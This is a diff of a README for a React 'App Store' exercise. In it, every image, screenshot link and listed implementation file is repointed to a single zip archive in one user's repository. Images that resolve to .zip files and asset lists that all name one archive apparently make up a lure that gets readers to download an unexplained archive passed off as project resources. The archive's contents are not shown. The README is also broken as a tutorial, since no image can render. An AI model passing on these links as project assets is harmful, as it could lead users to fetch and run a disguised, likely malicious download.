@@ -4,7 +4,7 @@ In this project, let's build an **App Store** by applying the concepts we have l
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip" alt="app store output" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip" alt="app store output" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build an **App Store** by applying the concepts we have l
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip)
+- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip)
 
 </details>
 
@@ -66,7 +66,7 @@ The app must have the following functionalities
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip" alt="app store component structure breakdown" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip" alt="app store component structure breakdown" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -78,12 +78,12 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip`
+- `https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip`
+- `https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip`
+- `https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip`
+- `https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip`
+- `https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip`
+- `https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip`
 
 </details>
 
@@ -100,7 +100,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip" alt="cursor pointer" style="width:100px" />
+   <img src="https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below `outline` CSS property for buttons and input elements to remove the highlighting when the elements are clicked
 
@@ -115,7 +115,7 @@ Use these files to complete the implementation:
 <details>
 <summary>Image URLs</summary>
 
-- [https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip](https://raw.githubusercontent.com/vicky9696v/react-Appstore/main/graphomaniac/react-Appstore.zip) alt should be **search icon**
+- [https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip](https://github.com/vicky9696v/react-Appstore/raw/refs/heads/main/src/components/TabItem/react-Appstore-1.0.zip) alt should be **search icon**
 
 </details>
 
